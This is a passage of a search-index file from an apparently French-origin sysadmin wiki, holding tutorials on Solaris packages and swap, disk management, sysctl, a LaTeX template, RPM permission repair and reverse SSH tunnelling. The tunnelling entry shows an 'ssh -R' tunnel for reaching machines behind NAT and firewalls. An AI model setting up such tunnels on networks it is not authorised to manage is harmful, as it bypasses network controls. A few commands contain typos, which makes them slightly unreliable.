linkhttps://forums13.itrc.hp.com/service/forums/questionanswer.do?admit=109447627+1253258346531+28353475\u0026threadId=223010\n"
            }
        );
    index.add(
            {
                id:  361 ,
                href: "\/Gestion_des_packages_Solaris\/",
                title: "Solaris Package Management",
                description: "A guide on how to manage packages in Solaris, including installation, verification, and removal of packages using various tools.",
                content: "Introduction linkPackages, like in all distributions, are a simple way to install software. Here we will examine all the ways to manage these packages.\nLocations linkTo find out what is installed on your system, simply look at the /var/sadm/install/contents file:\nmore /var/sadm/install/contents (output edited for brevity) /bin=./usr/bin s none SUNWcsr /dev d none 0755 root sys SUNWcsr SUNWcsd /dev/allkmem=../devices/pseudo/mm@0:allkmem s none SUNWcsd /dev/arp=../devices/pseudo/arp@0:arp s none SUNWcsd /etc/ftpd/ftpusers e ftpusers 0644 root sys 198 16387 1094222536 SUNWftpr /etc/passwd e passwd 0644 root sys 580 48298 1094222123 SUNWcsr To find where a specific software is installed on the system, you can do this:\npkgchk -l -P showrev Pathname: /usr/bin/showrev Type: regular file Expected mode: 0755 Expected owner: root Expected group: sys Expected file size (bytes): 29980 Expected sum(1) of contents: 57864 Expected last modification: Dec 14 06:17:58 AM 2004 Referenced by the following packages: SUNWadmc Current status: installed Pathname: /usr/share/man/man1m/showrev.1m Type: regular file Expected mode: 0644 Expected owner: root Expected group: root Expected file size (bytes): 3507 Expected sum(1) of contents: 35841 Expected last modification: Dec 10 10:42:54 PM 2004 Referenced by the following packages: SUNWman Current status: installed Identification linkWhen you have downloaded a package and want to check if it’s for SPARC or x86, here’s what to do:\nFirst, verify that it’s a package:\nfile SUNWrsc.pkg SUNWrsc.pkg:\tpackage datastream Then display the package header:\nhead SUNWrsc.pkg # PaCkAgE DaTaStReAm SUNWrsc 1 3266 # end of header SUNW_PRODVERS=2.2.1 SUNW_PKGVERS=1.0 PKG=SUNWrsc NAME=Remote System Control DESC=Sun Remote System Control system software ARCH=sparc VENDOR=Sun Microsystems, Inc. The Tools link Tools Descriptions pkgtrans Transform packages from one format to another pkgadd Install a package to the system pkgrm Remove a package from the system pkginfo Display information about a package pkgchk Verify the installation state of a package pkgtrans linkThis will transform the system package into the “data stream” format:\npkgtrans /var/tmp /tmp/SUNWrsc.pkg SUNWrsc You will get a pkg. If you want to do the reverse:\npkgtrans SUNWrsc.pkg . pkginfo linkHere’s an example:\npkginfo -l SUNWman PKGINST: SUNWman NAME: On-Line Manual Pages CATEGORY: system ARCH: sparc VERSION: 43.0,REV=67.0 BASEDIR: /usr VENDOR: Sun Microsystems, Inc. DESC: System Reference Manual Pages PSTAMP: 2004.09.01.17.00 INSTDATE: Sep 24 2004 12:32 HOTLINE: Please contact your local service provider STATUS: completely installed FILES: 11383 installed pathnames 8 shared pathnames 97 directories 119848 blocks used (approx) pkgadd linkTo install a specific package, do this:\npkgadd -d . SUNWvts Processing package instance from SunVTS Framework(sparc) 6.0,REV=2004.08.18.12.00 Copyright 2004 Sun Microsystems, Inc. All rights reserved. Use is subject to license terms. Using as the package base directory. ## Processing package information. ## Processing system information. ## Verifying package dependencies. ## Verifying disk space requirements. ## Checking for conflicts with packages already installed. ## Checking for setuid/setgid programs. This package contains scripts which will be executed with super-user permission during the process of installing this package. Do you want to continue with the installation of [y,n,?] y Installing SunVTS Framework as ## Installing part 1 of 1. 9213 blocks Installation of was successful. To install all packages in data stream format:\npkgadd -d /tmp/SUNWrsc.pkg all Processing package instance from Remote System Control(sparc) 2.2.1,REV=2002.02.11 Copyright 2001 Sun Microsystems, Inc. All rights reserved. Using \u003c/\u003e as the package base directory. ## Processing package information. ## Processing system information. 15 package pathnames are already properly installed. ## Verifying disk space requirements. ## Checking for conflicts with packages already installed. ## Checking for setuid/setgid programs. Installing Remote System Control as ## Installing part 1 of 1. 10499 blocks Installation of was successful. If the package is on a website:\npkgadd -d http://instructor/packages/SUNWrsc.pkg all ## Downloading... ..............25%..............50%..............75%..............100% ## Download Complete Processing package instance from Remote System Control(sparc) 2.2.1,REV=2002.02.11 Copyright 2001 Sun Microsystems, Inc. All rights reserved. Using \u003c/\u003e as the package base directory. ## Processing package information. ## Processing system information. 15 package pathnames are already properly installed. ## Verifying disk space requirements. ## Checking for conflicts with packages already installed. ## Checking for setuid/setgid programs. Installing Remote System Control as ## Installing part 1 of 1. 10499 blocks Installation of was successful. Spool linkThe spool is where packages go (/var/spool/pkg). If, for example, on a Sun CD, we want to install a package and also have it copied to the spool directory, here’s an example:\nkgadd -d /cdrom/cdrom0/s0/Solaris_10/Product -s spool SUNWauda Transferring package instance Let’s check:\nls -al /var/spool/pkg total 6 drwxrwxrwt 3 root bin 512 Oct 1 14:26 . drwxr-xr-x 12 root bin 512 Sep 30 20:03 .. drwxrwxr-x 5 root root 512 Oct 1 14:26 SUNWauda To install it later:\npkgadd SUNWauda pkgchk linkThis command allows you to verify if a package is properly installed (path, checksum…).\nTo list the contents of a package: pkgchk -v SUNWladm /usr /usr/sadm /usr/sadm/lib /usr/sadm/lib/localeadm /usr/sadm/lib/localeadm/Locale_config_S10.txt /usr/sadm/lib/localeadm/admin /usr/sbin /usr/sbin/localeadm To check if a file has changed from its original state (in the package): pkgchk -p /etc/shadow ERROR: /etc/shadow modtime \u003c09/03/04 03:35:24 PM\u003e expected \u003c09/30/04 08:06:14 PM\u003e actual file size \u003c296\u003e expected \u003c309\u003e actual file cksum \u003c20180\u003e expected \u003c21288\u003e actual The -l option lists the information about the package contents: pkgchk -l -p /usr/bin/showrev Pathname: /usr/bin/showrev Type: regular file Expected mode: 0755 Expected owner: root Expected group: sys Expected file size (bytes): 29656 Expected sum(1) of contents: 31261 Expected last modification: Sep 02 09:21:11 2004 Referenced by the following packages: SUNWadmc Current status: installed pkgrm linkTo remove a package:\npkgrm SUNWapchr The following package is currently installed: SUNWapchr Apache Web Server (root) (sparc) 11.10.0,REV=2004.08.20.02.37 Do you want to remove this package? [y,n,?,q] y ## Removing installed package instance ## Verifying package dependencies. WARNING: The package depends on the package currently being removed. WARNING: The package depends on the package currently being removed. WARNING: The package depends on the package currently being removed. WARNING: The package depends on the package currently being removed. Dependency checking failed. Do you want to continue with the removal of this package [y,n,?,q] y ## Processing package information. ## Removing pathnames in class /etc/rcS.d/K16apache /etc/rc3.d/S50apache /etc/rc2.d/K16apache (output ommited for brevity) /etc/apache/httpd.conf-example /etc/apache/README.Solaris /etc/apache /etc ## Updating system information. Removal of was successful. Spool linkTo remove a package and delete it from the spool:\npkgrm -s spool SUNWauda The following package is currently spooled: SUNWauda Audio Applications (sparc) 11.10.0,REV=2004.09.03.08.15 Do you want to remove this package? [y,n,?,q] y Removing spooled package instance pkgtrans linkTo transform packages into a stream package, it’s quite simple:\npkgtrans -s Product /var/tmp/stream.pkg SUNWzlib SUNWftpr SUNWftpu Transferring package instance Transferring package instance Transferring package instance Let’s verify:\nfile /var/tmp/stream.pkg Let’s look at the header:\nhead -5 /var/tmp/stream.pkg # PaCkAgE DaTaStReAm SUNWzlib 1 186 SUNWftpr 1 70 SUNWftpu 1 300 # end of header Now, for installation:\npkgadd -d /var/tmp/stream.pkg The following packages are available: 1 SUNWftpr FTP Server, (Root) (sparc) 11.10.0,REV=2004.12.11.01.30 2 SUNWftpu FTP Server, (Usr) (sparc) 11.10.0,REV=2004.12.11.01.30 3 SUNWzlib The Zip compression library (sparc) 11.10.0,REV=2004.12.10.05.25 Select package(s) you wish to process (or 'all' to process all packages). (default: all) [?,??,q]: q prodreg linkThis provides a graphical interface for managing packages, similar to Solaris installation:\nPackage Locations linkTo avoid risking damage to the main system, packages are installed in specific locations:\nFiles or Folders Description /var/sadm/install/contents List of all system packages /opt/pkgname Path for most installed packages /opt/pkgname/bin or /opt/bin Binaries for most installed packages /var/opt/pkgname or /etc/opt/pkgname Logs for most installed packages "
            }
        );
    index.add(
            {
                id:  362 ,
                href: "\/Template_pour_cr%C3%A9er_des_Cheat_Sheet_en_LaTeX\/",
                title: "LaTeX Template for Creating Cheat Sheets",
                description: "A guide for creating cheat sheets in LaTeX with a reusable template and formatting tips.",
                content: " Introduction linkLaTeX is a language and document composition system created by Leslie Lamport in 1983. More precisely, it’s a collection of macro-commands designed to facilitate the use of Donald Knuth’s “text processor” TeX. Since 1993, it has been maintained by the LATEX3 Project team. The first widely used version, called LaTeX2.09, came out in 1984. A major revision, called LaTeX2ε, was released in 1991.\nHaving cheat sheets is often very useful when learning a new language or working with new software. I wanted to create my own cheat sheets, but finding a template wasn’t easy. So I decided to share mine, which I built by drawing inspiration from others I found on the internet.\nCheat Sheet Template link % ----------------------------------------------------------------------- % Cheat Sheet Template % % Usage in Document content : % \\section : create a new section in column % % \\columnbreak : break the column to force following content to jump to % the next column % \\cm{command}{description} : set a dotted line between the command and % the description % ----------------------------------------------------------------------- % ----------------------------------------------------------------------- % Document settings % ----------------------------------------------------------------------- \\documentclass[10pt,landscape]{article} \\usepackage{multicol} \\usepackage{calc} \\usepackage{ifthen} \\usepackage[landscape]{geometry} \\usepackage{amsmath,amsthm,amsfonts,amssymb} \\usepackage{color,graphicx,overpic} \\usepackage{hyperref} % PDF informations \\pdfinfo{ /Title (cheat_sheet_template.pdf) /Creator (TeX) /Producer (/pdfTeX 1.40.0) /Author (Pierre Mavro) /Subject (Example) /Keywords (/pdflatex, latex,pdftex,tex)} % This sets page margins to .5 inch if using letter paper, and to 1cm % if using A4 paper. (This probably isn't strictly necessary.) % If using another size paper, use default 1cm margins. \\ifthenelse{\\lengthtest { \\paperwidth = 11in}} { \\geometry{top=.5in,left=.5in,right=.5in,bottom=.5in} } {\\ifthenelse{ \\lengthtest{ \\paperwidth = 297mm}} {\\geometry{top=1cm,left=1cm,right=1cm,bottom=1cm} } {\\geometry{top=1cm,left=1cm,right=1cm,bottom=1cm} } } % Turn off header and footer \\pagestyle{empty} % Redefine section commands to use less space \\makeatletter \\renewcommand{\\section}{\\@startsection{section}{1}{0mm}% {-1ex plus -.5ex minus -.2ex}% {0.5ex plus .2ex}%x {\\normalfont\\large\\bfseries}} \\renewcommand{\\subsection}{\\@startsection{subsection}{2}{0mm}% {-1explus -.5ex minus -.2ex}% {0.5ex plus .2ex}% {\\normalfont\\normalsize\\bfseries}} \\renewcommand{\\subsubsection}{\\@startsection{subsubsection}{3}{0mm}% {-1ex plus -.5ex minus -.2ex}% {1ex plus .2ex}% {\\normalfont\\small\\bfseries}} \\makeatother % Define BibTeX command \\def\\BibTeX{{\\rm B\\kern-.05em{\\sc i\\kern-.025em b}\\kern-.08em T\\kern-.1667em\\lower.7ex\\hbox{E}\\kern-.125emX}} % Don't print section numbers \\setcounter{secnumdepth}{0} % Set vertical view instead of horizontal (set to 0 to let it choose) \\setcounter{unbalance}{45} \\setlength{\\parindent}{0pt} \\setlength{\\parskip}{0pt plus 0.5ex} %My Environments \\newtheorem{example}[section]{Example} % Dot lines between command and description \\def\\cm#1#2{{\\tt#1}\\dotfill#2\\par} % ----------------------------------------------------------------------- % Document start % ----------------------------------------------------------------------- \\begin{document} \\raggedright \\footnotesize % Set number of columns \\begin{multicols}{3} % multicol parameters % These lengths are set only within the two main columns %\\setlength{\\columnseprule}{0.25pt} \\setlength{\\premulticols}{1pt} \\setlength{\\postmulticols}{1pt} \\setlength{\\multicolsep}{1pt} \\setlength{\\columnsep}{2pt} \\begin{center} \\Large{\\underline{Title}} \\\\ \\end{center} \\section{Section 1} Text \\subsection{xCode} Subsetction text \\section{Section 2} \\cm{key}{explaination} \\section{Section 3} Etc. % Autor \\rule{0.3\\linewidth}{0.25pt} \\section{Autor} \\href{mailto:xxx@mycompany.com}{Pierre Mavro (Deimosfr)} \\\\ \\url{http://www.mavro.fr} \\\\ \\url{http://www.deimos.fr} % References \\rule{0.3\\linewidth}{0.25pt} \\scriptsize \\bibliographystyle{abstract} \\bibliography{refFile} \\url{http://www.deimos.fr} \\end{multicols} \\end{document} Resources linkhttp://tex.stackexchange.com/questions/8827/preparing-cheat-sheets\n"
            }
        );
    index.add(
            {
                id:  363 ,
                href: "\/Sysctl_:_configurer_les_options_kernel_sous_Linux\/",
                title: "Sysctl: Configuring Kernel Options in Linux",
                description: "A guide to using sysctl to configure and manage Linux kernel parameters through /proc and /sys interfaces.",
                content: "Introduction linkSysctl is an interface that allows you to examine and dynamically modify parameters of BSD and Linux operating systems. The implementation is very different between these two systems.\nIn Linux, the sysctl interface mechanism is also exported as part of procfs in the sys directory. This difference means that checking the value of certain parameters requires opening a file in the virtual file system, reading and interpreting its content, and then closing it. The sysctl system call exists in Linux, but is not encapsulated by a glibc function and its use is discouraged.\nUsage linkFirst, you should know that there are two main paths: /proc and /sys:\n/proc: concerns memory, CPU, network, etc. /sys: concerns devices, disks, etc. Now let’s get to the point. To read a sysctl parameter, we’ll use the cat command:\ncat /proc/sys/net/ipv4/ip_forward /proc link/sys corresponds to what we call sysctls.\nFor persistence, after “/proc/sys/”, you simply need to replace the “/” with “.” to know the name of the parameter:\n/proc/sys/net/ipv4/ip_forward corresponds to\nnet.ipv4.ip_forward Applying values on the fly linkMethod 1 linkHere the default value is 0. If I want to enable IP forwarding on the fly, here’s how to do it:\necho 1 \u003e /proc/sys/net/ipv4/ip_forward This will activate the new value but in a non-persistent way (value reset after reboot).\nMethod 2 linkTo apply on the fly:\nsysctl -w net.ipv4.ip_forward=1 Applying values persistently linkSimply add this to the /etc/sysctl.conf file:\nnet.ipv4.ip_forward = 1 If you haven’t yet activated your new parameter, you can activate everything in the /etc/sysctl.conf file like this:\nsysctl -p /sys linkFor /sys, it’s unfortunately less straightforward than for /proc since only the /etc/rc.local file exists for persistence.\nDocumentation linkDebian linkTo get the kernel documentation, install this:\naptitude linux-doc-* The documentation is located in /usr/share/doc/linux-doc*/Documentation\nRedHat linkTo get the kernel documentation, install this:\naptitude kernel-doc The documentation is located in /usr/share/doc/kernel-doc*/Documentation\n"
            }
        );
    index.add(
            {
                id:  364 ,
                href: "\/Connaitre_le_nombre_de_cores_CPU_actifs_sur_Solaris\/",
                title: "How to Check the Number of Active CPU Cores on Solaris",
                description: "How to verify the number of active CPU cores on Solaris systems, which is useful for licensing and resource allocation",
                content: "Introduction linkOn certain machines (especially HP), it’s very practical for licensing issues to be able to limit the number of cores. Afterwards, it’s important to verify that the state is what you expect.\nUsage linkTo get the list of active cores:\n\u003e psrinfo -pv The physical processor has 1 virtual processor (0) x86 (chipid 0x0 GenuineIntel family 6 model 44 step 2 clock 2800 MHz) Intel(r) Xeon(r) CPU X5660 @ 2.80GHz The physical processor has 1 virtual processor (1) x86 (chipid 0x1 GenuineIntel family 6 model 44 step 2 clock 2800 MHz) Intel(r) Xeon(r) CPU X5660 @ 2.80GHz Here we can see that I only have one virtual CPU per processor (so 2 total).\nResources linkhttp://serverfault.com/questions/85478/sun-solaris-find-out-number-of-processors-and-cores\n"
            }
        );
    index.add(
            {
                id:  365 ,
                href: "\/Restaurer_les_permissions_d%5C%27une_Red_Hat\/",
                title: "Restore permissions on Red Hat",
                description: "How to restore file permissions on a Red Hat system after a permissions mistake",
                content: "Introduction linkA colleague of mine made a serious mistake (running chown -Rf mysql on /!). This caused a huge mess, and we had to find a solution to restore the correct permissions.\nFortunately, Red Hat anticipated these kinds of errors and included the --setperms and --setugids options in the rpm command to repair permissions on installed packages. Basically, this gives you a way to repair your machine.\nSo if you also made a mistake like this, know that there is a solution on Red Hat.\nUsage linkHere are the two magic commands:\nfor u in $(rpm -qa); do rpm --setugids $u; done for p in $(rpm -qa); do rpm --setperms $p; done You’ll need to do a bit of verification afterward because this only repairs the permissions of files and directories contained in installed packages. Your personal files will not have their permissions restored with this method.\nResources linkhttp://www.adminlinux.org/2009/07/how-to-restore-default-system.html\n"
            }
        );
    index.add(
            {
                id:  366 ,
                href: "\/Faire_du_reverse_Tunelling_avec_OpenSSH\/",
                title: "Reverse Tunneling with OpenSSH",
                description: "How to set up reverse tunneling with OpenSSH to access machines behind NAT and firewalls.",
                content: "Introduction linkThis is going to be really powerful! What am I proposing? Reverse tunneling? Yes! Imagine being able to traverse NAT. You’re already starting to salivate, so let’s not delay any further!\nSetup scenario link Here is the machine I want to connect to: 192.168.20.55 The machine from which I’m going to launch the connection: 138.47.99.99 (WAN IP) This will give us: Destination (192.168.20.55) \u003c- |NAT| \u003c- Source (138.47.99.99)\nConfiguration link We’ll connect here and use an unused port on our machine (let’s say 19999): ssh -N -R 19999:localhost:22 sourceuser@138.47.99.99 I can then pass through the tunnel like this (still from the source machine): ssh localhost -p 19999 Now it makes sense that I can access 192.168.20.55 via the 138.47.99.99 machine Destination (192.168.20.55) \u003c- |NAT| \u003c- Source (138.47.99.99) \u003c- Bob’s server\nFrom Bob’s server:\nssh sourceuser@138.47.99.99 After this connection, you’re on the target machine, now you’ll need to bounce through the tunnel to the first machine:\nssh localhost -p 19999 "
            }
        );
    index.add(
            {
                id:  367 ,
                href: "\/ajout-de-swap-sous-solaris\/",
                title: "Adding Swap Space on Solaris",
                description: "A guide on how to add, manage, and configure swap space in Solaris using different methods including UFS, ZFS, and swap files.",
                content: "Introduction linkThe purpose of this documentation is to quickly describe how to create swap space on Solaris. There are other documentation sources such as Disk Management in Solaris that describe in depth how disks work on Solaris, but that’s not the goal here.\nWe’ll look at three methods to add swap space:\nOn UFS On ZFS Using a swap file Swap on UFS linkIf you want to add swap space on a UFS disk, you’ll need to create a partition. Let’s first see what we have:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 Next, we’ll run the format command then select the disk we want to work with:\n\u003e Searching for disks...done AVAILABLE DISK SELECTIONS: 0. c1t0d0 /pci@0,0/pci10de,375@f/pci108e,286@0/disk@0,0 1. c2t201500A0B856312Cd31 /pci@7c,0/pci10de,377@f/pci1077,143@0/fp@0,0/disk@w201500a0b856312c,1f 2. c2t202400A0B856312Cd31 /pci@7c,0/pci10de,377@f/pci1077,143@0/fp@0,0/disk@w202400a0b856312c,1f 3. c3t201400A0B856312Cd31 ... Specify disk (enter its number): 0 We choose disk 0 here. Then we’ll enter the partition management tool:\nformat\u003e partition PARTITION MENU: 0 - change `0' partition 1 - change `1' partition 2 - change `2' partition 3 - change `3' partition 4 - change `4' partition 5 - change `5' partition 6 - change `6' partition 7 - change `7' partition select - select a predefined table modify - modify a predefined partition table name - name the current table print - display the current table label - write partition map and label to the disk ! - execute , then return quit Next, we’ll display the content to see the current partitions:\npartition\u003e p Current partition table (original): Total disk cylinders available: 53499 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 root wm 524 - 3134 20.00GB (2611/0/0) 41945715 1 swap wu 1 - 523 4.01GB (523/0/0) 8401995 2 backup wm 0 - 53498 409.82GB (53499/0/0) 859461435 3 var wm 3135 - 4440 10.00GB (1306/0/0) 20980890 4 unassigned wm 4441 - 4571 1.00GB (131/0/0) 2104515 5 unassigned wm 0 0 (0/0/0) 0 6 unassigned wm 0 0 (0/0/0) 0 7 home wm 4572 - 7182 20.00GB (2611/0/0) 41945715 8 boot wu 0 - 0 7.84MB (1/0/0) 16065 9 unassigned wm 0 0 (0/0/0) 0 We can see that the last cylinder is 7182 out of 53498. We’ll continue after this cylinder. Let’s take a random slice (slice 5 for example) and create a new swap partition on it:\npartition\u003e 5 Part Tag Flag Cylinders Size Blocks 5 unassigned wm 0 0 (0/0/0) 0 Enter partition id tag[unassigned]: swap Enter partition permission flags[wm]: wu Enter new starting cyl[1]: 7183 Enter partition size[0b, 0c, 7183e, 0.00mb, 0.00gb]: 70gb Here I’ve created a partition starting from the last used cylinder (7182) + 1 (7183), a swap partition with the corresponding flag (wu), with a size of 70GB. Then I display the new partition table:\npartition\u003e p Current partition table (unnamed): Total disk cylinders available: 53499 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 root wm 524 - 3134 20.00GB (2611/0/0) 41945715 1 swap wu 1 - 523 4.01GB (523/0/0) 8401995 2 backup wm 0 - 53498 409.82GB (53499/0/0) 859461435 3 var wm 3135 - 4440 10.00GB (1306/0/0) 20980890 4 unassigned wm 4441 - 4571 1.00GB (131/0/0) 2104515 5 swap wu 7183 - 16320 70.00GB (9138/0/0) 146801970 6 unassigned wm 0 0 (0/0/0) 0 7 home wm 4572 - 7182 20.00GB (2611/0/0) 41945715 8 boot wu 0 - 0 7.84MB (1/0/0) 16065 9 unassigned wm 0 0 (0/0/0) 0 Now I can see my new swap partition. Let’s write this new data to the disk:\npartition\u003e label Ready to label disk, continue? y We’ll exit and declare this new partition as a swap partition:\nswap -a /dev/dsk/c1t0d0s5 Now, when I display the list of active partitions, I can see the new one:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 /dev/dsk/c1t0d0s5 30,69 8 146801960 146801960 I just need to add a line in the vfstab for persistence:\n#device device mount FS fsck mount mount #to mount to fsck point type pass at boot options # fd - /dev/fd fd - no - /proc - /proc proc - no - /dev/dsk/c1t0d0s1 - - swap - no - /dev/dsk/c1t0d0s0 /dev/rdsk/c1t0d0s0 / ufs 1 no - /dev/dsk/c1t0d0s3 /dev/rdsk/c1t0d0s3 /var ufs 1 no - /dev/dsk/c1t0d0s5 - - swap - no - /dev/dsk/c1t0d0s7 /dev/rdsk/c1t0d0s7 /export/home ufs 2 yes - #/dev/dsk/c1t0d0s4 /dev/rdsk/c1t0d0s4 /globaldevices ufs 2 yes - /devices - /devices devfs - no - sharefs - /etc/dfs/sharetab sharefs - no - ctfs - /system/contract ctfs - no - objfs - /system/object objfs - no - swap - /tmp tmpfs - yes - /dev/did/dsk/d4s4 /dev/did/rdsk/d4s4 /global/.devices/node@2 ufs 2 no global Swap on ZFS linkYou simply need to increase the size of the ZFS associated with the swap.\nAdding a Swap linkLet’s check how many swaps are allocated:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 Now we add a ZFS:\nzfs create -V 30G rpool/swap1 Here we’ve created a 30GB swap. Then we declare this new partition as swap:\nswap -a /dev/zvol/dsk/rpool/swap1 Now, when I display the list of active partitions, I can see the new one:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 /dev/dsk/c1t0d0s5 30,69 8 146801960 146801960 If you get this kind of message:\n/dev/zvol/dsk/rpool/swap is in use for live upgrade -. Please see ludelete(1M). You’ll need to use the following command to activate it:\n/sbin/swapadd Enlarging a Swap linkWhen the machine is running and the swap space is being used, you can increase the size of the swap so that the system can use it. This will require deactivation and reactivation for the new space to be recognized. To do this, we’ll enlarge the ZFS:\nzfs set volsize=72G rpool/swap zfs set refreservation=72G rpool/swap Now we’ll deactivate the swap:\nswap -d /dev/zvol/dsk/rpool/swap We need to remove or comment out the swap entry in /etc/vfstab corresponding to the swap, as it will be automatically created in the next step:\n#/dev/zvol/dsk/rpool/swap - - swap - no - Then reactivate it for the new size to be recognized:\nswap -a /dev/zvol/dsk/rpool/swap We can verify the swap size:\n\u003e swap -l swapfile dev swaplo blocs libres /dev/zvol/dsk/rpool/swap 181,1 8 150994936 150994936 Swap File linkFor a swap file, it’s the quickest method to implement but also the least elegant. Find a place on your disk where you have space and create an empty file of the desired size:\nmkfile 70g /swap1 Then we activate this new swap:\nswap -a /swap1 Now, when I display the list of active partitions, I can see the new one:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 /dev/dsk/c1t0d0s5 30,69 8 146801960 146801960 "
            }
        );
    index.add(
            {
                id:  368 ,
                href: "\/Management_des_disques_sous_Solaris\/",
                title: "Disk Management in Solaris",
                description: "A comprehensive guide on managing disks in Solaris, covering physical disk structure, partitioning, filesystems, and troubleshooting.",
                content: "Introduction linkCompared to Linux, Solaris is quite similar except for certain aspects which I will clarify here. This guide will not only cover Solaris but also include general information about disk architecture and filesystems.\nPhysical Operation linkFiles, Inodes and Blocks linkOn your hard drive, where you store your data, there is a hierarchical structure:\nDirectories and files Inodes Blocks Inodes are what know exactly where each directory/file is located. When you create or call a file, it points to an inode. This inode is then able to identify which data block it belongs to (binary slice). Here’s a small explanation with an image:\nHardware Recognition linkTo recognize where a specific device is located on our system, here’s a brief explanation: Assuming we have a file in /dev like: c0t0d0s0. This means:\nc0: On Controller 0 t0: On SCSI Target 0 d0: I have Disk 0 s0: And I am positioned on Slice 0 Here are some examples:\nSCSI link IDE link Slices linkThen, the slices (also called partitions) are defined as follows for better performance optimization:\nWhat About My Machine? linkTo start, you should know what’s on your machine. For this, there are 3 solutions:\npath_to_inst link cat /etc/path_to_inst # # Caution! This file contains critical kernel state # \"/pseudo\" 0 \"pseudo\" \"/options\" 0 \"options\" \"/xsvc\" 0 \"xsvc\" \"/objmgr\" 0 \"objmgr\" \"/scsi_vhci\" 0 \"scsi_vhci\" \"/isa\" 0 \"isa\" \"/isa/i8042@1,60\" 0 \"i8042\" \"/isa/i8042@1,60/keyboard@0\" 0 \"kb8042\" \"/isa/i8042@1,60/mouse@1\" 0 \"mouse8042\" \"/isa/lp@1,378\" 0 \"ecpp\" \"/isa/asy@1,3f8\" 0 \"asy\" \"/isa/asy@1,2f8\" 1 \"asy\" \"/isa/fdc@1,3f0\" 0 \"fdc\" \"/isa/fdc@1,3f0/fd@0,0\" 0 \"fd\" \"/ramdisk\" 0 \"ramdisk\" \"/pci@0,0\" 0 \"pci\" \"/pci@0,0/display@f\" 0 \"vgatext\" \"/pci@0,0/pci8086,7191@1\" 0 \"pci_pci\" \"/pci@0,0/pci-ide@7,1\" 0 \"pci-ide\" \"/pci@0,0/pci-ide@7,1/ide@0\" 0 \"ata\" \"/pci@0,0/pci-ide@7,1/ide@0/cmdk@0,0\" 0 \"cmdk\" \"/pci@0,0/pci-ide@7,1/ide@1\" 1 \"ata\" \"/pci@0,0/pci-ide@7,1/ide@1/sd@0,0\" 16 \"sd\" \"/pci@0,0/pci1000,30@10\" 0 \"mpt\" \"/pci@0,0/pci1022,2000@11\" 0 \"pcn\" \"/iscsi\" 0 \"iscsi\" Prtconf link prtconf | grep -v not System Configuration: Sun Microsystems i86pc Memory size: 512 Megabytes System Peripherals (Software Nodes): i86pc scsi_vhci, instance #0 isa, instance #0 i8042, instance #0 keyboard, instance #0 mouse, instance #0 fdc, instance #0 pci, instance #0 pci8086,7191, instance #0 pci-ide, instance #0 ide, instance #0 cmdk, instance #0 ide, instance #1 sd, instance #16 display, instance #0 pci1000,30, instance #0 pci1022,2000, instance #0 iscsi, instance #0 pseudo, instance #0 options, instance #0 xsvc, instance #0 objmgr, instance #0 Format link format Searching for disks...done AVAILABLE DISK SELECTIONS: 0. c0d0 /pci@0,0/pci-ide@7,1/ide@0/cmdk@0,0 Adding a Device linkWith Reboot linkTo have our disk detected at boot, we need to create a /reconfigure file:\ntouch /reconfigure Then, simply connect your device and restart your machine. Once done, configure the slices.\nWithout Reboot linkIf it’s a “critical” machine, you need to run the “devfsadm” command. This command will try to match the loaded kernel drivers with the devices in /devices.\nHere are some usage examples:\nDefining devices such as disk, tape, port, audio or pseudo: devfsadm -c disk -c tape -c audio Configure only one device based on the driver: devfsadm -i driver_name Configure disks only supported by certain controllers (dad, st or sd) devfsadm -i dad For verbose mode devfsadm -v To flush (clear) symbolic links that point to non-existent devices: devfsadm -c Partitioning linkThe disk partitioning is made of slices that are delimited by cylinders. Indeed, a slice occupies a strip of cylinders (ex: 1 to 2850). Then the next slice will go from 2850 to 5000.\nThe partitions are therefore determined from the first cylinder of each slice:\nSlice 1: Cylinder 0 to 2850 Slice 2: Cylinder 2850 to 5000 …\nWaste linkWasting cylinders creates a potentially empty slice. You can use it later. However, in case of defective sectors, it is possible that the partition will shrink due to lost cylinders.\nOverlapping linkOverlapping occurs when multiple slices access the same cylinder (usually one slice encroaching on another). To fix this problem, when you edit your partition, use the “modify” command:\nmodify Select partitioning base: 0. Current partition table (unnamed) 1. All Free Hog Choose base (enter number) [0]? 0 Warning: Overlapping partition (1) in table. Warning: Fix, or select a different partition table. Defining Partitions linkThe format command automatically handles partitioning according to data in /etc/format.dat. The advantage is that it’s super fast and easy when adding a disk. Now, manually, here’s how to do it:\nformat Searching for disks...done AVAILABLE DISK SELECTIONS: 0. c0t0d0 /pci@1f,0/pci@1,1/ide@3/dad@0,0 1. c1t3d0 /pci@1f,0/pci@1/scsi@1/sd@3,0 Specify disk (enter its number): Now we have the list of detected disks. We’ll choose the second disk and continue:\nSpecify disk (enter its number): 1 selecting c1t3d0 [disk formatted] FORMAT MENU: disk - select a disk type - select (define) a disk type partition - select (define) a partition table current - describe the current disk format - format and analyze the disk repair - repair a defective sector label - write label to the disk analyze - surface analysis defect - defect list management backup - search for backup labels verify - read and display labels save - save new disk/partition definitions inquiry - show vendor, product and revision scsi - independent SCSI mode selects cache - enable, disable or query SCSI disk cache volname - set 8-character volume name ! - execute , then return quit format\u003e In the menus that we can see, change or confirm partition choices, we have:\nElements Functions partition Displays the partition menu label Writes the current partition name list to the disk verify Reads and displays disk names quit Exit the format utility Then type partition to see the menu:\nformat\u003e partition PARTITION MENU: 0 - change '0' partition 1 - change '1' partition 2 - change '2' partition 3 - change '3' partition 4 - change '4' partition 5 - change '5' partition 6 - change '6' partition 7 - change '7' partition select - select a predefined table modify - modify a predefined partition table name - name the current table print - display the current table label - write partition map and label to the disk ! - execute , then return quit Here are the options offered:\nElements Functions 0-7 Specify partition size and offset select Choose a predefined slice in /etc/format.dat modify Change current partition in the table quit Used to identify the partition table in /etc/format.dat print Display the current partition table label Write the current partition table ! Execute an external command at the shell level To display the new partition table, type print:\npartition\u003e print Current partition table (original): Total disk cylinders available: 4924 + 2 (reserved cylinders) Part Tag Flag Cylinders Size Blocks 0 unassigned wm 0 0 (0/0/0) 0 1 unassigned wm 0 0 (0/0/0) 0 2 backup ru 0 - 4923 